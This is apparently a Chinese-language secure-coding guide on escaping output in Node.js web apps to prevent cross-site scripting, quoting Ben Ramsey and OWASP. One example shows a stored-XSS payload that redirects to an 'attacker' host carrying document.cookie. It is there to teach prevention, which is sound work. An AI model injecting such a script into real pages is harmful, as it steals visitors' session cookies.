# 转义输出

### 一段解释

HTML和其他web语言将内容与可执行代码混合在一起 - 单个HTML段落可能包含数据的可视化表示以及JavaScript执行指令。在呈现HTML或从API返回数据时, 我们认为纯内容实际上可能会嵌入Javascript代码, 这些代码将由浏览器解释和执行。例如, 当我们呈现攻击者插入到数据库的内容时, 就会发生这种情况 - 例如 `<div><script>//malicious code</script></div>`。这可以通过指示浏览器将任何不受信任的数据块仅视为内容, 而从不解释它来缓解 - 这种技术称为转义。许多npm库和HTML模板引擎提供了转义功能(例如: [escape-html](https://github.com/component/escape-html), [node-esapi](https://github.com/ESAPI/node-esapi))。不仅应该转义HTML内容, 而且CSS和Javascript也应该被转义。


### 代码示例 - 不要将不受信任的数据放入html中 

```javascript
<script>...NEVER PUT UNTRUSTED DATA HERE...</script>   directly in a script
 
 <!--...NEVER PUT UNTRUSTED DATA HERE...-->             inside an HTML comment
 
 <div ...NEVER PUT UNTRUSTED DATA HERE...=test />       in an attribute name
 
 <NEVER PUT UNTRUSTED DATA HERE... href="/test" />   in a tag name
 
 <style>...NEVER PUT UNTRUSTED DATA HERE...</style>   directly in CSS

```

### 代码示例 - 恶意内容可能会注入到数据库中

```javascript
<div>
  <b>A pseudo comment to the a post</b>
  <script>
    window.location='http://attacker/?cookie='+document.cookie
</script>
</div>

```

<br/><br/>

### 博客引用: "当我们不希望字符被解释"

摘自博客[benramsey.com](https://benramsey.com/articles/escape-output/)
> 数据可能会以HTML的形式离开应用程序而被发送到Web浏览器，同理，SQL发送到数据库，XML发送到RSS读取器，WML发送到无线设备等。可能性是无限的。其中每一个都有自己的一组特殊字符, 对这些字符的解释不同于接收到的其他纯文本。有时我们希望发送这些特殊字符, 以便对其进行解释 (例如, HTML标签发送到Web浏览器), 而有时 (从用户或其他来源的输入的情况下), 我们不希望这些字符被解释, 因此我们需要转义他们。

> 转义有时也称为编码。简而言之, 它是以不会执行或解释数据的方式表示数据的过程。例如, HTML将在Web浏览器中以粗体文本呈现以下文本，因为<strong>标签有特殊的含义: 
<strong>This is bold text.</strong>
但是, 假设我想在浏览器中呈现标签, 并避免对它们的解释。这样, 我需要转义在HTML中具有特殊含义的尖括号。下面说明了转义的HTML:

&lt;strong&gt;This is bold text.&lt;/strong&gt;


<br/><br/>

### 博客引用: "OWASP推荐使用以安全为中心的编码库"

摘自博客OWASP [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
> "编写这些编码器并不是极其困难, 但也有不少隐藏的陷阱。例如，您可能会尝试使用一些转义的快捷方式， 比如Javascript中的"\"。但是, 这些值是危险的, 可能会被嵌套在浏览器中的解析器误解。您也可能忘记转义转义字符串, 而攻击者可以用它使您的安全尝试无效。**OWASP建议使用以安全为中心的编码库, 以确保这些规则得到正确执行**。"


<br/><br/>

### 博客引用: "您必须对HTML片段使用转义语法"

摘自博客OWASP [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
> "假如您把不受信任的数据放在一个置于某处的<script>标签中，或一个事件处理属性比如onmouseover，或在CSS中，或在一个URL里， HTML实体编码将不起作用。因此, 即使您在任何地方都使用HTML实体编码方法, 您仍然最容易受到XSS的攻击。您必须对将不受信任的数据放入的HTML文档部分使用转义语法。"